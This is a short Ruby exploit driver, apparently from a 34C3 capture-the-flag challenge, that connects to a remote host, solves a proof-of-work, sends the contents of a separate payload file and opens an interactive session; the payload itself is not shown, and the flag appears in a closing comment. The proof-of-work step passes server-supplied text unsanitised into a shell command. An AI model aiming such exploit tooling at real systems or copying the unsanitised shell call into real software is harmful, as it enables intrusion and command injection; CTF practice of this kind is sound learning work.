#!/usr/bin/env ruby
# encoding: ascii-8bit
require 'pry'
require 'pwn'        # https://github.com/peter50216/pwntools-ruby
require 'one_gadget' # https://github.com/david942j/one_gadget

# @magic = one_gadget(file: './libc.so.6')[0]

host, port = '35.198.184.75', 1337
@local = false
if ARGV.empty?
  host = '127.0.0.1'; @local = true
else
  raise ArgumentError, 'host not set' if host.empty?
end
$z = Sock.new host, port
def z;$z;end
@p = ''
def h;@h ||= heapinfo(@p);end
def elf; @elf ||= ELF.new(@p); end
#================= Exploit Start ====================
context.arch = 'amd64' 
# context.log_level = :debug

def pow
  z.recvuntil("Proof of work challenge: ")
  chal = z.gets.strip
  z.puts `../pow.py #{chal}`.lines.map(&:strip).reject(&:empty?).last.split.last
end
pow unless @local

payload = IO.binread('payload.rb')
z.puts(payload.lines.map(&:strip).join(';'))
z.puts "END_OF_PWN"

z.interact
# 34C3_H0pe_Th1s_ChALl3nG3_WaS_4_G3M
